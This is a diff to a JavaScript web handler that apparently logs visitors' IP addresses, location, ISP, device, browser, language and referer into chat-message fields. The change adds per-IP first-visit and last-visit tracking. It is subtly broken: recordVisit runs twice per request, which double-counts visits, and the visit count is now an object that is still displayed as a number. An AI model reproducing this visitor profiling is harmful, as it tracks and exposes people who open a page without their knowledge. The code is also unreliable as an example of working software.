@@ -101,18 +101,32 @@ function getOperatingSystem(userAgent) {
     return 'Unknown';
 }
 
-// Create a global in-memory store for visit counts
+// Create a global in-memory store for visit data
 const visitStore = {};
 
-// Function to increment visit counter for an IP
-function incrementVisitCounter(ip) {
+// Function to record visit data for an IP
+function recordVisit(ip) {
+    const currentTime = new Date().toISOString();
     if (!visitStore[ip]) {
-        visitStore[ip] = 1; // Initialize count if IP not present
+        // Initialize data for a new IP
+        visitStore[ip] = {
+            visitCount: 1,
+            firstVisit: currentTime,
+            lastVisit: currentTime
+        };
     } else {
-        visitStore[ip] += 1; // Increment count
+        // Update existing data
+        visitStore[ip].visitCount += 1;
+        visitStore[ip].lastVisit = currentTime;
     }
     return visitStore[ip];
 }
+
+// Function to get visit data for an IP
+function getVisitData(ip) {
+    return visitStore[ip] || { visitCount: 0, firstVisit: "Never", lastVisit: "Never" };
+}
+
 
 
 function logDebugInfo(reverseDNS) {
@@ -121,7 +135,7 @@ function logDebugInfo(reverseDNS) {
 
 
 function createCommonFields(
-    ipDetails, port, coords, userAgent, tlsVersion, deviceType, os, browserEngine,
+    ipDetails, port, coords, userAgent, visitData, deviceType, os, browserEngine,
     acceptLanguage, acceptEncoding, doNotTrack, referer,
     visitCount
 ) {
@@ -135,7 +149,7 @@ function createCommonFields(
         { name: "Port", value: `\`${port}\``, inline: true },
         { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
         { name: "Visit Count", value: `\`${visitCount}\``, inline: true },
-        { name: "TLS Version", value: `\`${tlsVersion}\``, inline: true },
+        { name: "Last Visit", value: `\`${visitData.lastVisit}\``, inline: true },
         { name: "ASN", value: safeValue(ipDetails.as), inline: true },
         { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
         { name: "Country", value: safeValue(ipDetails.country), inline: true },
@@ -201,7 +215,13 @@ export default async function handler(req, res) {
 
 
              // Increment and retrieve visit count for the current IP
-        const visitCount = incrementVisitCounter(ip);
+        const visitCount = recordVisit(ip);
+
+        // Record visit data
+        const visitData = recordVisit(ip);
+
+        // Log visit data
+        console.log(`Visit Data for IP ${ip}:`, visitData);
             
 
         // Perform reverse DNS lookup
@@ -346,7 +366,7 @@ export default async function handler(req, res) {
                     port,
                     coords,
                     userAgent,
-                    tlsVersion,
+                    visitData,
                     deviceType,
                     os,
                     browserEngine,
